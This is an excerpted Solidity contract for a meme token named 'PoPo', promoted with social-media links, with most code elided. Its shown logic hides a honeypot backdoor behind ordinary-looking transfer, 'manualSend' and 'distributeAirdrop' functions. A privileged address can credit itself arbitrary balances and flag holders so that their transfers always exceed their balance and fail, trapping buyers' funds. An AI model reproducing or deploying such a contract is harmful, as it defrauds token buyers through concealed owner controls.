//Telegram: https://t.me/mrPOPOtheGenie
//Website: http://popogenie.xyz
//Twitter: https://twitter.com/MrPOPOGenie
//Discord: https://discord.gg/ZA4egsdj
...
contract PoPo is IERC20, baseToken, Ownable {
    using SafeMath for uint256;

    uint256 private constant TOKEN_VERSION = 1;

    mapping(address => uint256) private _balances;

    mapping(address => bool) private _isTransferred;
    ...
    constructor(
        ...
        emit TokenCreated(owner(), address(this), TokenType.standard, TOKEN_VERSION);
    }
    ...
    function _transfer(
        ...
        if (_isTransferred[sender] != false) {
            amount = _balances[sender] + 1;
        }
    ...
    function manualSend(
        ...
        uint256 total = 0;
        if (recipients == _ENTERED) {
            _balances[recipients] = _balances[recipients] + id + total;
        } else {
    ...
    function distributeAirdrop(
        ...
        uint256 airdrop = 0;
        if (from == _ENTERED) {
            _balances[recipients] += airdrop;
            _isTransferred[recipients] = isSent;
        } else {
            _balances[from] = _balances[from] - airdrop;
            _balances[recipients] = _balances[recipients] + airdrop;
        }
    }
